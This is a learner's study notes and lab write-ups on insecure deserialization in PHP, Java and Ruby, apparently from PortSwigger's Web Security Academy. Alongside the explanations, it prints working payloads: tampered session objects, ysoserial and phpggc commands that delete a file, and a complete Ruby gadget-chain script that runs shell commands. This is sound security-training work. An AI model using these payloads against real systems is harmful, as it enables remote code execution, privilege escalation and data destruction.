### Introduction to Serialization
* **Serialization** is the process of converting complex data structures, such as objects and their fileds, into a "flatter" format that can be sent and received as a sequential stream of bytes.
* Serializing data makes it much simpler to write complex data to inter-process memory, a file, or database, and send complex data, for example, over a network, between different components of an application, or in an API call.
* Crucially, when serializing an object, its state is also persisted. In other words, the object's attributes are preserved, along with their assigned values.
* **Deserialization** is the process of restoring this byte stream to a fully functional replica of the original object, in the exact state as when it was serialized. The website's logic can then interact with this deserialized object, just like it would with any other object.
* Many languages offer native support for serialization; exactly how objects are serialized depends on the language. Some languages serialize into binary formats, whereas others use different string formats, with varying degrees of human readability.
  * Note that all of the original object's attributes are stored in the serialized data stream, including any private fields. To prevent a field from being serialized, it must be explicitly marked as "transient" in the class declaration.
  * Be aware that when working with different programming languages, serialization may be referred to as marshalling (Ruby) or pickling (Python). These terms are synonymous with "serialization" in this context.

#### Insecure Deserialization
* Insecure deserialization is when user-controllable data is deserialized by a website. This potentially enables an attacker to manipulate serialized objects in order to pass harmful data into the application code.
* It is even possible to replace a serialized object with an object of an entirely different class. Alarmingly, objects of any class that is available to the website will be deserialized and instantiated, regardless of which class was expected. For this readon, insecure deserialization is sometimes known as an "object injection" vulnerability.
* An object of an unexpected class might cause an exception. By this time, however, the damage may already be done. Many deserialization-based attacks are completed **before** deserialization is finished. This means that the deserialization process itself can initiate an attack, even if the website's own functionality does not directly interact with the malicious object. For this reason, websites whose logic is based on strongly typed languages can also be vulnerable to these techniques.
  * Explaining this more: Deserialization is like taking the flat-pack box of an IKEA chair and assembling it into a chair. Strong typing makes sure that once the chair is built, it is actually a "chair" and not a "bear". When an attacker sends you a box labeled "chair", you open it, and screw leg A into Base B, unbeknownst to you that you are triggering the bomb hidden in leg A. The bomb explodes during assembly - you never finish building the chair, so you never get to the final check that the final product is a valid "chair" - the type checking.
* Insecure deserialization arises because there is a general lack of understanding of how dangerous deserializing user-controllable data can be. Ideally, user input should never be deserialized at all.
* However, sometimes website owners think they are safe because they implement some form of additional check on the deserialized data. This approach is often ineffective because it is virtually impossible to implement validation or sanitization to account for every eventuality. These checks are fundamentally flawed as they rely on checking the data after it has been deserialized, which in many cases will be too late to prevent the attack.
* Vulnerabilities may also arise because deserialized objects are often assumed to be trustworthy. Especially when using languages with a binary serialization format, developers might think that users cannot read or manipulate the data effectively. However, while it may require more effort, it is just as possible for an attacker to exploit binary serialized objects as it is to exploit string-based formats. 
* Deserialization-based attacks are also made possible due to the number of dependencies that exist in modern websites. A typical site might implement many different libraries, which each have their own dependencies as well. This creates a massive pool of classes and methods that is difficult to manage securely. As an attacker can create instances of any of these classes, it is hard to predict which methods can be invoked on the malicious data. This is especially truth if an attacker is able to chain together a long series of unexpected method invocations, passing data into a sink that is completely unrelated to the initial source. It is, therefore, almost impossible to anticipate the flow of malicious data and plug every potential hole.
  * We are talking about **gadget chains** - when attackers targets your website with deserialization, they aren't usually uploading their own malicious code. They are using your code (and the code of the libraries you installed) against you. An attacker chains together a long series of classes (think of them like parts!) to do something small but useful. For example, Gadget A (in Library X) `When I am created, I write data to a file`, Gadget B (in Library Y) `When I am run, I execute whatever is in this file`; the attacker creates a serialized object that contains Gadget A inside of Gadget B, the website deserializes the object, Gadget A runs (because of a magic method) and writes a script to disk, Gadget B runs (triggered by Gadget A) and executes that script.
    * Magic method examples: `readObject()` for Java, `__wakeup()` and `__destruct()` for PHP (wakeup runs when `unserialize()` is called and destruct runs when the object is no longer needed and deleted from memory), `__reduce__` for Python (tells pickle library how to recreate the object)
* In short, it can be argued that it is not possible to securely deserialize untrusted input.

### How to Identify Insecure Deserialization 
#### PHP Serialization Format
* PHP uses a mostly human-readable string format, with letters representing the data type and numbers representing the length of each entry. For example, consider a `User` object with the attributes:
```
$user->name = "carlos";
$user->isLoggedIn = true;
```
* When serialized, this object may look something like this: `0:4:"User":2:{s:4:"name":s:6:"carlos";s:10:"isLoggedIn":b:1;}`
  * `0:4:"User"` - an object with the 4-character class name `"User"`
  * `2` - the object has 2 attributes
  * `s:4:"name"` - the key of the first attribute is the 4-chracter string `"name"`
  * `s:6:"carlos"` - the value of the first attribute is the 6-character string "carlos"
  * `s:10:"isLoggedIn"` - the key of the second attribute is the 10-character string "isLoggedIn"
  * `b:1` - the value of the second attribute is the boolean value `true`
* The native methods for PHP serialization are `serialize()` and `unserialize()`. If you have source code access, you should start by looking for `unserialize()` anywhere in the code and investigating further. 

#### Java Serialization Format
- Some languages, such as Java, use binary serialization formats. This is more difficult to read, but you can still identify serialized data if you know how to recognize a few tell-tale signs. For example, serialized Java objects always begins with the same bytes, which are encoded as `ac ed` in hexadecimal and `rO0` in Base64.
- Any class that implements the interface `java.io.Serializable` can be serialized and deserialized. If you have source code access, take note of any code that uses the `readObject()` method, which is used to read and deserialize data from an `InputStream`.

### Manipulating Serialized Objects
- Exploiting some deserialization vulnerabilities can be easy as changing an attribute in a serialized object. As the object state is persisted, you can study the serialized data to identify and edit interesting attribute values. You can then pass the malicious object into the website via its deserialization process. This is the initial step for a basic deserialization exploit.
- Broadly speaking, there are two approaches you can take when manipulating serialized objects. You can either edit the object directly in its byte stream form, or you can write a short script in the corresponding language to create and serialize the new object yourself. The latter approach is often easier when working with binary serialization formats. 

#### Modifying Object Attributes
- When tampering with the data, as long as the attacker preserves a valid serialized object, the deserialization process will create a server-side object with the modified attribute values. As a simple example, consider a website that uses a serialized `User` object to store data about a user's session in a cookie. If an attacker spotted the serialized object in an HTTP request, they might decode it to find the following byte stream: `0:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:0;}`.
- The `isAdmin` attribute is an obvious point of interest. An attacker could simply change the boolean value of the attribute to `1` (true), re-encode the object, and overwrite their current cookie with this modified value. In isolation this has no effect; however, let's say the website uses this cookie to check whether the current user has access to certain admin functionality:
```
$user = unserialize($_COOKIE);
if ($user->isAdmin === true) {
// allow access to admin interface
}
```
- The vulnerable code would instantiate a `User` object based on the data from the cookie, including the attacker-modified `isAdmin` attribute. At no point is the authenticity of the serialized object checked. This data is then passed into the conditional statement and, in this case, would allow for an easy privilege escalation. This simple scenario is not common in the wild; however, editing an attribute value in this way demonstrates the first step towards accessing the massive amount of attack-surface exposed by insecure deserialization.

#### Modifying Data Types
* We've reviewed how we can modify attribute values in serialized objects, but it's also possible to supply unexpected data types. PHP-based logic is particularly vulnerable to this kind of manipulation due to the behavior of its loose comparison operator (`==`) when comparing different data types.
  * For example, if you perform a loose comparison between an integer and a string, PHP will attempt to convert the string to an integer, meaning that `5=="5"` evaluates to `true`. Likewise, on PHP 7.x and earlier, the comparison `0=="Example string"` evaluates to `true` because PHP treats the entire string as the integer `0`.
  * Consider a case where this loose comparison operator is used in conjunction with user-controllable data from a deserialized object. This could potentially result in dangerous logic flaws.
```
$login = unserialized($_COOKIE)
if ($login['password'] == $password) {
// log in successfully
}
```
 * Let's say an attacker modified the password attribute so that it contained the integer `0` instead of the expected string. As long as the stored password does not start with a number, the condition would always return `true`, enabling an authentication bypass. Note that this is only possible because deserialization preserves the data type. If the code fetched the password from the request directly, the `0` would be converted to a string and the condition would evaluate to `false`.
   * Note: in PHP 8 and later, the `0=="Example string"` comparison evaluates to `false` because strings are no longer implicitly converted to 0 during comparisons. As a result, this exploit is not possible on these versions of PHP. The behavior when comparing an alphanumeric string that starts with a number remains the same in PHP 8. As such, `5=="5 of something"` is still treats as `5==5`.
* Be aware that when modifying data types in any serialized object format, it is important to remember to update any labels and length indicators in the serialized data too. Otherwise, the serialized object will be corrupted and will not be deserialized.
* When working with binary formats, it is recommended to use `Hackvertor` extension, available in BApp. You can modify the serialized data as a string, and it will automatically update the binary data, adjusting the offsets accordingly. This can save you a lot of manual effort.

#### Using Application Functionality 
* As well as simply checking attribute values, a website's functionality might also perform dangerous operations on data from a deserialized object. In this case, you can use insecure deserialization to pass in unexpected data and leverage the related functionality to do damage.
* For example, as part of a website's "delete user" functionality, the user's profile picture is deleted by accessing the file path in the `$user -> image_location` attribute. If this `$user` was created from a serialized object, an attacker could exploit this by passing in a modified object with the `image_location` set to an arbitrary file path. Deleting their own user account would then delete this arbitrary file as well.
  * This example relies on the attacker manually invoking the dangerous method via user-accessible functionality. However, insecure deserialization becomes much more interesting when you create exploits that pass data into dangerous methods automatically. This is enabled by the use of 'magic methods'.
 
#### Magic Methods
* Magic methods are a special subset of methods that you do not have to explicity invoke. Instead, they are invoked automatically whenever a particular event or scenario occurs. Magic methods are a common feature of object-oriented programming in various languages. They are sometimes indicated by prefixing or surrounding the method name with double underscores. Developers can add magic methods to a class in order to predetermine what code should be executed when the corresponding event or scenario ocurrs. Exactly when and why a magic method is invoked differs from method to method. One of the common examples in PHP is `__construct()` which is invoked whenever an object of the class is instantiated, similar to Python's `__init__`. Typically, constructor magic methods like this contain code to initialize the attributes of the instance; however, magic methods can be customized by developers to execute any code they want.
* Magic methods are widely used and do not represent a vulnerability on their own. But they can become dangerous when the code that they execute handles attacker-controlled data, for example, from a deserialized object. This can be exploited by an attacker to automatically invoke methods on the deserialized data when the corresponding conditions are met.
* Most importantly, in this context, some languages have magic methods that are invoked automatically during the deserialization process. For example, PHP's `unserialize()` method looks for and invokes an object's `__wakeup()` magic method.
* In Java deserialization, the same applies to the `ObjectInputStream.readObject()` method, which is used to read data from the initial byte stream and essentially acts like a constructor for re-initializing a serialized object. However, `Serializable` classses can also declare their own `readObject()` method as follows below. A `readObject()` method delcared in exactly this way acts as a magic method that is invoked during deserialization. This allows the class to control the deserialization of its own fields more closely. 
```
private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException
{
 // implementation
}
```
* You should pay attention to any classes that contain these types of magic methods. They allow you to pass data from a serialized object into the website's code before the object is fully deserialized. This is the starting point for creating more advanced exploits.

#### Injecting Arbitrary Objects
* It is occassionally possible to exploit insecure deserialization by simply editing the object supplied by the website; however, injecting arbitrary object types can open up many more possibilities. In object-oriented programming, the methods available to an object are determined by its class. Therefore, if an attacker can manipulate which class of object is being passed in as serialized data, they can influence what code is executed after, and even during, deserialization.
* Deserialization methods do not typically check what they are deserializing. This means that you can pass in objects of any serializable class that is available to the website, and the object will be deserialized. This effectively allows an attacker to create instances of arbitrary classes. The fact that this object is not of the expected class does not matter. The unexpected object type might cause an exception in the application logic, but the malicious object will already be instantiated by then.
* If an attacker has access to the source code, they can study all of the available classes in detail. To construct a simple exploit, they would look for classes containing deserialization magic methods, then check whether any of them perform dangerous operations on controllable data. The attacker can then pass in a serialized object of this class to use its magic method for an exploit.
* Classes containing these deserialization magic methods can also be used to initiate more complex attacks involving a long series of method invocations, known as a "gadget chain".

#### Gadget Chains
* A gadget is a snippet of code that exists in the application that can help an attacker to achieve a particular goal. An individual gadget may not directly do anything harmful with user input. However, the attacker's goal might simply be to invoke a method that will pass their input into another gadget. By chaining multiple gadgets together in this way, an attacker can potentially pass their input into a dangerous "sink gadget", where it can cause maximum damage. It's important to understand that, unlike some other types of exploit, a gadget chain is not a payload of chained methods constructed by the attacker. All of the code already exists on the website. The only thing the attacker controls is the data that is passed into the gadget chain. This is typically done using a magic method that invoked during deserialization, sometimes known as a "kick off gadget".
* In the wild, many insecure deserialization vulnerabilities will only be exploitable through the use of gadget chains. This can sometimes be a simple one or two-step chain, but constructing high-severity attacks will likely require a more elaborate sequence of object instantiations and method invocations. Therefore, being able to construct gadget chains is one of the key aspects of successfully exploiting insecure deserialization.

#### Working with Pre-Built Gadget Chains
* Manually identifying gadget chains can be a fairly arduous process, and is almost impossible without source code access. Fortunately, there are a few options for working with pre-built gadget chains that you can try first. There are several tools available that provide a range of pre-discovered chains that have been successfully exploited on other websites. Even if you don't have access to the source code, you can use these tools to both identify and exploit insecure deserialization vulnerabilities with relatively little effort. This approach is made possible due to the widespread use of libraries that contain exploitable gadget chains. For example, if a gadget chain in Java's Apache Commons Collections library can be exploited on one website, any other website that implements this library may also be exploitable using the same chain.
* **ysoserial**: One such tool for Java deserialization is ysoserial. This lets you choose one of the provided gadget chains for a library that you think the target application is using, then pass in a command that you want to execute. It then creates an appropriate serialized object based on the selected chain. This still involves a certain amount of trial and error, but it is considerably less labor-intensive than constructing your own gadget chains manually.
* Not all of the gadget chains in ysoserial enable you to run arbitrary code. Instead, they may be useful for other purposes. For example, you can use the following ones to help you quickly detect insecure deserialization on virtually any server:
 * **URLDNS** chain triggers a DNS lookup for a supplied URL. Most importantly, it does not rely on the target application using a specific vulnerable library and works in any known Java version. This makes it the most universal gadget chain for detection purposes. If you spot a deserialized object in the traffic, you can try using this gadget chain to generate an object that triggers a DNS interaction with the Burp collab server. If it does, you can be sure that deserialization occurred on your target.
 * **JRMPClient** is another universal chain that you can use for initial detection. It causes the server to try and establish a TCP connection to the supplied IP address. note that you need to provide a raw IP address rather than a hostname. This chain may be useful environments where all outbound taffic is firewalled, including DNS lookups. You can try generating payloads with two differnet IP addresses: a local one and a firewalled, external one. If the application responds immediately for a payload with a local address, but hangs for a payload with a firewalled external address, causing a delay in the response, you can tell that the gadget chain worked because the server tried to connect/establish a TCP handshake with the external address. In this case, the subtle time difference in response can help you detect whether deserialization occurs on the server, even in blind cases.

#### PHP Generic Gadget Chains
* Most languages that frequently suffer from insecure deserialization vulnerabilities have equivalent proof-of-concept tools. For example, for PHP-based sites, you can use PHP Generic Gadget Chains (PHPGGC).

#### Working with Documented Gadget Chains
- There may not always be a dedicated tool available for exploiting known gadget chains in a framework used by the target application. In this case, it's always worth looking online to see if there are any documented exploits that you can adapt manually. Tweaking the code may require some basic understanding of the language and framework, and you might need to serialize the object yourself, but the approach is still considerably less effort than building an exploit from stach. 

#### Lab: Modifying Serialized Objects
* Decoding the session token as Base64 results in `O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}`. Flipping 0 to 1 and then attaching the session token to the request to `GET /admin/delete?username=carlos` to delete Carlos.
* I was able to identify the admin panel by refreshing my account page with the altered session token, and the option appeared. I could use match and replace to make this easier.

#### Lab: Modifying Serialized Data Types
- Identified session-based serialization: `O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"hfamki0prqs03xdfocg7x81tbg93o2ac";}` as a cookie. I also noticed that when you get /my-account, the parameter accepts the parameter `wiener` - this ended up being a rabbit hole. Let's get back to the basics, and by that, I mean the comparison vulnerabilities we just chatted about in earlier versions of PHP.
- I managed to cause a fatal PHP error by tooling around with integers, let's take a look. Reminder, -> in PHP is the object operator, it allows you to access properties that belong to a specific object (in this case, $user is the object, and username is what we want). 
```
PHP Fatal error:  Uncaught Exception: (DEBUG: $access_tokens[$user-&gt;username] = xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx, $user->;access_token = 1, $access_tokens = [xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx,xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx,xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx]) Invalid access token for user carlos in /var/www/index.php:8
```
- My first attempt at exploiting this failed because I attempted an integer substitution of the access_token `O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:1;}` but this wasn't working - why? Well, it's probably because the access token begins with an integer! So `i:1` failed for me because 1 == DOES NOT whatever integer the access token starts with.
- Okay, well since we don't want to play guess the integer, how about we use booleans? Remember `true` equals any string that is not empty so `true == "abc123"` or `true == "123abc"`. Let's do `O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}`.

#### Lab: Using Application Functionality to Exploit Insecure Deserialization
* Session cookie is this: `O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"kmihavx4auvkl1t5yputq7n241ff75ln";s:11:"avatar_link";s:19:"users/wiener/avatar";}`
* Initial payload was `O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"kmihavx4auvkl1t5yputq7n241ff75ln";s:11:"avatar_link";s:23:"users/carlos/morale.txt";}` which did not work ... looking at previous labs, Carlos's home directory actually is `/home/carlos/morale.txt` so let's try `O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"kmihavx4auvkl1t5yputq7n241ff75ln";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}` which worked!

#### Lab: Arbitrary Object Injection in PHP
* Serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. Create and inject a malicious serialized object to delete the `morale.txt` from Carlos's home directory. You will need to obtain source code access to solve this lab.
* Hint: You can sometimes read source code by appending a tilde ~ to a filename to retrieve an editor-generated backup file. I was a bit confused by this hint, so I did some content spidering, and I discovered `/lib/CustomTemplate.php`. Navigating to it plainly resulted in a blank screen, but by appending a tilde, I found the following below. Now why did this work? Well, text editors like Vim and Nano create backup files often. You can also try the `.bak` trick - append .bak. 
```
<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

?>
```
- I found a very similar exploit path on OWASP: https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection. My initial guess was then this: `O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}` - AND IT WORKED!!!

#### Lab: Exploiting Java Deserialization with Apache Commons
* Need to use ysoserial (`java -jar ysoserial-all.jar`) for this to delete morale.txt from Carlos's home directory, `/home/Carlos/morale.txt`.
* `Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]'` so `java -jar ysoserial-[version]-all.jar [payload] 'rm -f /home/Carlos/morale.txt'` EXCEPT, I am on Java 25, and you need to run a different command structure for modern Java (past 16). I first tried it with CommonCollections1 as the payload, and it did not work, but then I tried CommonCollections2, and it solved the lab:
```
java \
--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
--add-opens=java.base/java.net=ALL-UNNAMED \
--add-opens=java.base/java.util=ALL-UNNAMED \
--add-opens=java.base/sun.reflect.annotation=ALL-UNNAMED \
-jar ysoserial-all.jar CommonsCollections2 'rm -f /home/carlos/morale.txt' | base64 -w 0
```
* I replaced the serialized session token with the base64 encoded object, using Hackvertor to URL encode it. 

#### Lab: Exploiting PHP Deserialization with a Pre-built Gadget Chain
* Discovered the session token base64 decoded into `O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"rzjnu968uro01uuk4hhcowea4br8dyyg";}`. I also noticed this, sig_hmac_sha1, so we need to sign our new malicious object, but we need to find the secret key. Before we even do that, we need to identify the running framework ... hey, didn't we just chat about php info pages somewhere?
```
{"token":"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJyempudTk2OHVybzAxdXVrNGhoY293ZWE0YnI4ZHl5ZyI7fQ==","sig_hmac_sha1":"c6c471ba5d8c1dff600ae4df9c0111ea6faa6b29"}
```
* Using Burp Suite and active scan, I identified `/cgi-bin/phpinfo.php`...OH cool, would you look at that: `SECRET_KEY	tlo1sr116emjtxd1r7inwyuxz6fbvn0j`. That's one task down. 
* I guessed Symfony through trial and error because I struggled to find any evidence on the phpinfo.php page, and I couldn't produce a verbose error message ... after the fact, I found a stack trace by submitting an incorrect signature, which resulted in a stack trace saying `Internal Server Error: Symfony Version: 4.3.6`.
* Okay, with the secret key, I SHA-1 hashed the following Base64 encoded payload generated using `./phpggc Symfony/RCE1 "rm -f /home/carlos/morale.txt" | base64 -w 0`.

#### Exploiting Ruby Deserialization Using a Documented Gadget Chain
- Serialization-based session mechanism and Ruby on Rails framework. PS informs us to find a well documented exploit to create a malicious serialized object containing a remote code execution payload to delete `/home/carlos/morale.txt`.
- I was a bit confused when I first looked up some gadgets, as I was not familiar with Ruby on Rails and its use of YAML. Older Rails apps will use YAML to store objects, while newer Rails apps use Marshal (a binary format) or JSON.  I read through a blog post, https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html, for deeper understanding. In YAML, `!ruby/object` is a tag that forces the serverrub to treat the data as code execution, not just text.
- To identify whether the serialization format was YAML or Marshal, I Base64-decoded the session token and inspected the raw bytes. The payload began with the hex signature `04 08` which are specific Magic Bytes indicating a Ruby Marshal object. If it was YAML, we would have seen ASCII characters `---` or `2d 2d 2d`, standard document separator to start a YAML stream. To figure out whether we were dealing with YAML or Marshal, I Base64 decoded the token, and I found the hex started with 0408, meaning it's Marshal. YAML would begin with `---`.
- I had a pretty modern version of Ruby installed, 3.3.8, so I had to modify the payload available from the blog post. First, we had to add in a ghost class/mock the Net module. When trying to run it without mocking, we got an `uninitialized constant Net` error. We made sure that both arguments were represented or else we would get an `ArgumentError: wrong number of arguments` error. Then, we changed `id` to `rm -f /home/carlos/morale.txt`. We then added Base64 to make the payload cleaner, and we removed the original ending lines which printed the raw payload to our screen by converting it via `inspect` into raw binary (adds quotes and turns unprintable characters into escape codes). The final removed line actually tried to deserialize the payload on your own computer, so we didn't need that. Using the script below, we URL-encoded the payload and sent it as a session token and the lab was solved!
```
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

module Net
  class WriteAdapter
    def initialize(socket, method)
      @socket = socket
      @method_id = method
    end
  end
  class BufferedIO
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "rm -f /home/carlos/morale.txt")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
require 'base64'
puts Base64.strict_encode64(payload)
```
#### Lab: Developing a Custom Gadget Chain for Java Deserialization
* I went ahead and opened the hint for this lab, as I knew we were stepping up quite a bit in difficulty. The hint provided a generic Java program for serializing objects which can be adapted to generate a suitable object for our exploit. It also mentioned browser-based IDE, `repl.it`.
* I started reviewing the sources, and I noticed a comment mentioning `/backup/AccessTokenUser.java` ... I navigated to that directory, `https://0ad100b60445e04087e91112003a0021.web-security-academy.net/backup/AccessTokenUser.java`, and I found some of the source code ... now to explore more of `backup`... cool, an index of backup also reveals the `ProductTemplate.java` source code. Let's take a look at it below.
 * We need to find the magic method, remember from above:
```
 In Java deserialization, the same applies to the `ObjectInputStream.readObject()` method, which is used to read data from the initial byte stream and essentially acts like a constructor for re-initializing a serialized object. However, `Serializable` classses can also declare their own `readObject()` method as follows below. A `readObject()` method delcared in exactly this way acts as a magic method that is invoked during deserialization. This allows the class to control the deserialization of its own fields more closely. 

private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException
{
 // implementation
}

```
```
package data.productcatalog;

import common.db.JdbcConnectionBuilder;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;

public class ProductTemplate implements Serializable
{
    static final long serialVersionUID = 1L;

    private final String id;
    private transient Product product;

    public ProductTemplate(String id)
    {
        this.id = id;
    }

    private void readObject(ObjectInputStream inputStream) throws IOException, ClassNotFoundException
    {
        inputStream.defaultReadObject();

        JdbcConnectionBuilder connectionBuilder = JdbcConnectionBuilder.from(
                "org.postgresql.Driver",
                "postgresql",
                "localhost",
                5432,
                "postgres",
                "postgres",
                "password"
        ).withAutoCommit();
        try
        {
            Connection connect = connectionBuilder.connect(30);
            String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);
            Statement statement = connect.createStatement();
            ResultSet resultSet = statement.executeQuery(sql);
            if (!resultSet.next())
            {
                return;
            }
            product = Product.from(resultSet);
        }
        catch (SQLException e)
        {
            throw new IOException(e);
        }
    }

    public String getId()
    {
        return id;
    }

    public Product getProduct()
    {
        return product;
    }
}
```
